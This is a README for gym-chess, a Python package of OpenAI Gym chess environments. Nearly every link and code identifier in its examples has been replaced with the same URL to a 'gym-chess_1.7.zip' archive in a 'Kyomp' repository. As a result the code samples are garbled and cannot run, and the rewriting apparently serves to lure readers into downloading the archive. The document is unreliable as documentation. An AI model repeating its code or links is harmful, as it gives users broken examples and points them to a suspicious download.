# gym-chess: OpenAI Gym environments for Chess

## Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Chess-v0](#chess-v0)
4. [ChessAlphaZero-v0](#chessalphazero-v0)
5. [Acknowledgements](#acknowledgements)

## Introduction

gym-chess provides [OpenAI Gym](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip) environments for the 
game of Chess. It comes with an implementation of the board and move 
encoding used in [AlphaZero](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip), 
yet leaves you the freedom to define your own encodings via wrappers.

Let's watch a random agent play against itself:

```python
>>> import gym
>>> import gym_chess
>>> import random

>>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('Chess-v0')
>>> print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip())

>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
>>> done = False

>>> while not done:
>>>     action = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip)
>>>     https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(action)
>>>     print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(mode='unicode'))

>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
```

## Installation

gym-chess requires Python 3.6 or later.

To install gym-chess, run:

```shell
$ pip install gym-chess
```

Importing gym-chess will automatically register the `Chess-v0` and 
`ChessAlphaZero-v0` envs with gym:

```python
>>> import gym
>>> import gym_chess

>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
dict_values([... EnvSpec(Chess-v0), EnvSpec(ChessAlphaZero-v0)])
```


## Chess-v0

gym-chess defines a basic `Chess-v0` environment which represents 
observations and actions as objects of type `https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip` and `https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip`, 
respectively. These classes come from the
[python-chess](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip) package which implements
the game logic.

```python

>>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('Chess-v0')
>>> state = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
>>> type(state)
https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip

>>> print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(mode='unicode'))
♜ ♞ ♝ ♛ ♚ ♝ ♞ ♜
♟ ♟ ♟ ♟ ♟ ♟ ♟ ♟
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
♙ ♙ ♙ ♙ ♙ ♙ ♙ ♙
♖ ♘ ♗ ♕ ♔ ♗ ♘ ♖

>>> move = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4')
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(move)
>>> print(https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(mode='unicode'))
♜ ♞ ♝ ♛ ♚ ♝ ♞ ♜
♟ ♟ ♟ ♟ ♟ ♟ ♟ ♟
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
⭘ ⭘ ⭘ ⭘ ♙ ⭘ ⭘ ⭘
⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘ ⭘
♙ ♙ ♙ ♙ ⭘ ♙ ♙ ♙
♖ ♘ ♗ ♕ ♔ ♗ ♘ ♖

```

A list of legal moves for the current position is exposed via the `legal_moves`
property:

```
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip()
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
[https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g1h3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g1f3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b1c3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b1a3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('h2h3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g2g3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('f2f3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('d2d3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('c2c3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b2b3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('a2a3'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('h2h4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('g2g4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('f2f4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('d2d4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('c2c4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('b2b4'),
 https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('a2a4')]

```

Using ordinary Python objects (rather than NumPy arrays) as an agent interface 
is arguably unorthodox. An immideate consequence of this approach is that 
`Chess-v0` has no well-defined `observation_space` and `action_space`; hence 
these member variables are set to `None`. However, this design allows us to 
seperate the game's _implementation_ from its _representation_, which is left to 
wrapper classes.


The agent plays for both players, black **and** white, by making moves
for either color in turn. An episode ends when a player wins (i.e. the agent
makes a move that puts the opponent player into checkmate), or the game results 
in a draw (e.g. by reaching a stalemate position, insufficient material, or one
or more other draw conditions according to the 
[FIDE Rules of Chess](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip)). 
Note that there is currently no option for the agent to let a player resign or
offer a draw voluntarily.

The agent receives a reward of +1 when the white player makes a winning move,
and a reward of -1 when the black player makes a winning move. All other rewards
are zero.


## ChessAlphaZero-v0

gym-chess ships with an implementation of the board and move encoding proposed 
by [AlphaZero]() (see [Silver et al., 2017]()).

```python
>>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('ChessAlphaZero-v0')
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
Box(8, 8, 119)

>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
Discrete(4672)
```

For a detailed description of how these encodings work, consider reading the 
paper or consult the docstring of the respective classes.

In addition to `legal_moves`, ChessAlphaZero-v0 also exposes a list of all
legal actions (i.e. encoded legal moves):

```python
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
[494,
 501,
 129,
 136,
 1095,
 1022,
 949,
 876,
 803,
 730,
 657,
 584,
 1096,
 1023,
 950,
 877,
 804,
 731,
 658,
 585]
```

Moves can be converted to actions and vice versawith the `encode` and `decode` 
methods, which may facilitate debugging and experimentation:

```
>>> move = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4')
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(move)
877
>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(move) in https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip
True

>>> https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip(877)
https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('e2e4')
```

Internally, the encoding is implemented via wrapper classes 
(`https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip` and `https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip`,
respectively), which can be used independently of one another. This gives you 
the flexibility to define your own board and move representations, and easily
switch between them.

```python
>>> import gym_chess
>>> from https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip import BoardEncoding

>>> env = https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip('Chess-v0')
>>> env = BoardEncoding(env, history_length=4)
>>> env = MyEsotericMoveEncoding(env)
```


## Acknowledgements

Thanks to @niklasf for providing the awesome 
[python-chess](https://raw.githubusercontent.com/Kyomp/gym-chess/master/gym_chess/alphazero/gym-chess_1.7.zip) package.
